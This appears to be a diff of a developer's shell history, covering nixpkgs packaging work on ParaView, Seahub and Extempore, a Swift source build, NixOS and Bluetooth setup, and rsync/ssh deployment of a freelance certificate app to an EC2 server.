+NIXPKGS_ALLOW_UNFREE=1 nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { qtbase = qt5.qtbase; qtx11extras = qt5.qtx11extras; qttools = qt5.qttools; qtxmlpatterns = qt5.qtxmlpatterns; qtsvg = qt5.qtsvg; }'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; }'
+❯ nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; }'<\n>error:<\n>       … while calling the 'abort' builtin<\n>         at /nix/store/8vz84mqgnm1gz5yk7hgnnb5gir5hjxas-source/lib/customisation.nix:310:7:<\n>          309|     else<\n>          310|       abort "lib.customisation.callPackageWith: ${error}";<\n>             |       ^<\n>          311|<\n><\n>       error: evaluation aborted with the following error message: 'lib.customisation.callPackageWith: Function called without required argument "wrapQtAppsHook" at /home/chikoyeat/projects/clones/nixpkgs/pkgs/applications/graphics/paraview/default.nix:8, did you mean "wrapGAppsHook"?'<\n><\n>applications/graphics/paraview on  master [!]<\n>❯:q
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; }'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5 wrapQtAppsHook; }'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix <\n><\n>'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix <\n><\n>'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5 wrapQtAppsHook; }'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5 wrapQtAppsHook; }'
+cd nixpkgs/pkgs/applications/graphics/paraview/
+cd ~/projects/clones/
+cd nixpkgs/pkgs/applications/graphics/paraview/
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5 wrapQtAppsHook; }'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+zeditor .
+nix-build -j $(($(nproc) - 1)) -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit qt5; wrapQtAppsHook = qt5.wrapQtAppsHook; }'
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit (qt5) qtbase wrapQtAppsHook; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit (qt5) qtbase qtbase.wrapQtAppsHook qtsvg; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit (qt5) qtbase qtsvg wrapQtAppsHook; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit (qt5) qtbase qtsvg qttools wrapQtAppsHook; }'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix { inherit (qt5) qtbase qtsvg qttools qtx11extras wrapQtAppsHook; }'<\n>
+cd nixpkgs/pkgs/applications/graphics/paraview/
+nixfmt default.nix
+ls
+cd ~/projects/clones/
+cd nixpkgs/pkgs/applications/graphics/paraview/
+nixfmt default.nix
+nix-shell -p nix-info --run "nix-info -m"
+ls
+cd ~/projects/freelance/certiapp/
+zeditor .
+deno run dev
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/
+cd anxj/api
+sqlite3 certificates.db;
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/
+git add .
+git commit -m "lallala" 
+git push
+cd ~/projects/freelance/certiapp/
+zeditor .
+cd ~/projects/freelance/certiapp/
+git add .
+git commit -m "lallalab" 
+git push
+cd ~/projects/clones/
+switft
+swift
+git clone https://github.com/swiftlang/swift.git
+swift --version
+cd swift
+ls
+git clone https://github.com/swiftlang/swift.git
+git clone https://github.com/swiftlang/swift.git --depth 1
+cd swift/lib/Sema/TypeCheckType.cpp
+ls
+cd swift/lib/Sema/
+ls
+cd ..
+zeditor .
+cd ~/projects/clones/swift/
+# From the build directory<\n>./bin/swift-test --filter="forward_declared_protocol"
+swift # From the build directory<\n>./bin/swift-test --filter="forward_declared_protocol"
+swift ./bin/swift-test --filter="forward_declared_protocol"
+swift ./bin/swift-test/Sema --filter="forward_declared_protocol"
+./bin/swift-test --filter="forward_declared_protocol"
+ls
+mkdir build<\n>cd build<\n><\n># Configure the build with CMake<\n>cmake -G Ninja ../<\n><\n># Build the test targets<\n>ninja swift-test
+cd ..
+rm -rf build/
+touch shell.nix
+hx shell.nix
+nix-shell
+zeditor .
+nix-shell
+# Clone libdispatch if you haven't already<\n>git clone https://github.com/apple/swift-corelibs-libdispatch.git<\n># Note the full path to where you cloned it<\n><\n># Then in your build command, specify the path correctly:<\n>cmake -G Ninja \<\n>  -DCMAKE_BUILD_TYPE=Debug \<\n>  -DSWIFT_PATH_TO_LIBDISPATCH_SOURCE=/full/path/to/swift-corelibs-libdispatch \<\n>  -DLLVM_ENABLE_ASSERTIONS=TRUE \<\n>  -DSWIFT_STDLIB_ASSERTIONS=TRUE \<\n>  ../
+vim .
+cd ~/projects/clones/swift/
+cd ..
+cd ~/projects/freelance/certiapp/
+vim .
+hx .
+ls
+cd ~/projects/clones/
+rm -rf nixpkgs/
+git clone https://github.com/NixOS/nixpkgs.git --depth 1
+cd nixpkgs/pkgs/by-name/se/seahub/
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+hx .
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+nix-prefetch-github haiwen seahub --rev v12.0.7-pro<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+nix-prefetch-github haiwen seahub --rev v12.0.6-pro<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+nixfmt package.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+nixpkgs-review pr --post-result 369550
+cd ..
+https://gcc.gnu.org/onlinedocs/gcc-14.2.0/gcc/Warning-Options.html#index-Wimplicit-function-declaration-Wimplicit-function-declaration8;
+cd ~/projects/clones/nixpkgs/
+cd pkgs/by-name/se/seahub/
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+export NIXPKGS_ALLOW_BROKEN=1
+NIXPKGS_ALLOW_BROKEN=1
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+rm -rf /home/chikoyeat/.cache/nixpkgs-review/pr-369550/nixpkgs/pkgs/development/python-modules/pysaml2/default.nix
+rm -rf <\n>         at
+rm -rf <\n>         at/home/chikoyeat/.cache/nixpkgs-review/pr-369550/nixpkgs/lib/customisation.nix:
+rm -rf /home/chikoyeat/.cache/nixpkgs-review/pr-369550/nixpkgs/lib/customisation.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+cd ../../../../
+cd ..
+rm -rf nixpkgs/
+git clone https://github.com/NixOS/nixpkgs.git --depth 1
+cd nixpkgs/pkgs/by-name/se/seahub/
+ls
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+cd nixpkgs/pkgs/by-name/se/seahub/
+cd ~/projects/clones/
+cd nixpkgs/pkgs/by-name/se/seahub/
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+git pull --depth 1
+git fetch --depth 1
+cd ~/projects/clones/nixpkgs/pkgs/by-name/se/seahub/
+nix-build -E 'with import <nixpkgs> {}; callPackage ./package.nix {}'
+cd /etc/nixos
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+nix-prefetch-url "https://www.paraview.org/paraview-downloads/download.php?submit=Download&version=v5.13&type=data&os=Sources&downloadFile=ParaViewGettingStarted-5.13.2.pdf"
+nix-prefetch-url "https://www.paraview.org/paraview-downloads/download.php?submit=Download&version=v5.13&type=data&os=Sources&downloadFile=ParaViewGettingStarted-5.13.0.pdf"
+cd ~/projects/clones/
+rm -rf nixpkgs/
+git clone https://github.com/NixOS/nixpkgs.git --depth 1
+cd nixpkgs/pkgs/development/compilers/
+mkdir extempore
+cd extempore/
+hx .
+hx default.nix
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+hx .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+zeditor .
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix log /nix/store/692wv69qq6z3sp9y5a3gidzzqdv0y43n-extempore-0.8.9.drv
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix log /nix/store/gp94fw9cjbz3j9nrdk7s9rmx6wh17h3m-extempore-0.8.9.drv
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix log /nix/store/ygbryzmnq3k5qw3rcd88mbr81q4x9mix-extempore-0.8.9.drv
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix log /nix/store/lhii4dgzbr2yvchwbswic37v601q8z79-extempore-0.8.9.drv
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nix log /nix/store/klr9z6wn3qhdj0rr0nyawlvabky82848-extempore-0.8.9.drv<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'
+nixfmt default.nix
+bluetoothcli
+bluetoothctl
+flatpak install flathub io.emeric.toolblex
+emacs
+git clone --depth 1 https://github.com/doomemacs/doomemacs ~/.config/emacs<\n>~/.config/emacs/bin/doom install
+rm -rf /home/chikoyeat/.config/emacs
+emacs .
+git clone --depth 1 https://github.com/doomemacs/doomemacs ~/.config/emacs<\n>~/.config/emacs/bin/doom install
+cd ~/projects/freelance/certiapp/
+ls
+zeditor .
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/anxj/api/
+curl -X GET http://16.171.141.84:5000/api/certificates/recent<\n>
+curl -X GET http://16.171.141.84:5000/api/api/certificates/recent<\n>
+cd ~/projects/freelance/certiapp/anxj/api/
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+sqlite3 certificates.db;
+curl -X GET http://16.171.141.84:5000/api/api/certificates/recent<\n>
+git add .
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+curl -X GET http://16.171.141.84:5000/api/api/certificates/recent<\n>
+curl -X GET http://16.171.141.84:5000/api/certificates/recent<\n>
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+curl -X GET http://16.171.141.84:5000/api/certificates/recent<\n>
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+curl -X GET http://16.171.141.84:5000/api/certificates/recent<\n>
+curl -X GET http://16.171.141.84:5000/api/certificates/
+ssh -i "~/.ssh/newinst.pem" ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com
+flatpak install flathub io.emeric.toolblex
+bluetoothctl
+cd /etc/nixos
+ls
+cd /etc/nixos
+sudo hx .
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+sudo hx .
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+sudo hx .
+sudo nixos-rebuild switch --flake . --upgrade<\n>
+sudo systemctl start bluetooth<\n>sudo systemctl enable bluetooth<\n>
+systemctl restart pipewire<\n>
+pavucontrol<\n>
+reboot
+bluetoothctl
+pavucontrol<\n>
+bluez
+bluz
+cd ~/projects/freelance/certiapp/
+ls
+hx .
+loca
+deno
+deno run de
+deno run dev
+deno upgrade
+sudo deno upgrade
+cd /etc/nixos
+hx .
+deno version
+deno --version
+hx .
+deno run dev
+cd anxj/api
+ls
+rm -rf certificates.db
+rm -rf enrollment.sqlite
+ls
+cd ~/projects/freelance/certiapp/
+deno run dev
+zeditor .
+curl -X GET http://16.171.141.84:5000/api/certificates/
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/
+git add .
+git commit -m "Dc badge maybe finished??" 
+git push
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+cd ~/projects/freelance/certiapp/
+rsync -avz --exclude 'node_modules' --exclude '.git' --exclude '.env' --exclude '.next' --exclude 'src' --exclude 'src-tauri' --exclude '.env.*' -e "ssh -i ~/.ssh/newinst.pem" ./ ubuntu@ec2-16-171-141-84.eu-north-1.compute.amazonaws.com:~/projects/freelance/certiapp/
+git add .
+cd ~/projects/freelance/certiapp/
+git add .
+git commit -m "Dc badge maybe typefix" 
+git push
+cd ..
+mkdir deno
+cd deno/
+deno init
+ls
+deno run main.ts
+deno task dev
+deno test
+cd deno/
+cd ~/projects/freelance/certiapp/
+git add .
+git commit -m "dc fetch maybe typefix" 
+git push
+nixpkgs-review pr --post-result 373998
+cd ~/projects/clones/nixpkgs/
+cd pkgs/development/compilers/extempore/
+nix-build -E 'with import <nixpkgs> {}; callPackage ./your-file.nix {}'<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+nix-build -E 'with import <nixpkgs> {}; llvm-patched'<\n>
+/nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9/bin/extempore<\n>
+ls -l /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9/bin/extempore<\n>
+chmod +x /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9/bin/extempore<\n>
+ldd /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9/bin/extempore<\n>
+ls -l /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9/<\n>
+ls
+cd result
+ls
+cd ..
+nix log /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9<\n>
+find /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9 -type f -name "extempore"<\n>
+^find /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9 -type f -name "extempore"<\n>
+find /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9 name =~ "extempore" type == "file"<\n>
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}' --show-trace<\n>
+nix-build -A extempore -K<\n>cd /build/source/build<\n>find . -name "extempore"<\n>
+cd /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9<\n>find . -name "extempore"<\n>
+cd /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9
+find . -name "extempore"
+cd ~/projects/clones/nixpkgs/
+cd pkgs/development/compilers/extempore/
+nix-build -E 'with import <nixpkgs> {}; callPackage ./default.nix {}'<\n>
+cd /nix/store/4rxxdkkdc28gsm2nzfvjac5an0i3y08z-extempore-0.8.9
+ls
+cd ~/projects/clones/nixpkgs/
+cd pkgs/development/compilers/extempore/
+cd ~/projects/NIXCF/
+ls
+cd ~/.config
+ls
+thunar .
+cd dotfiles/
+ls
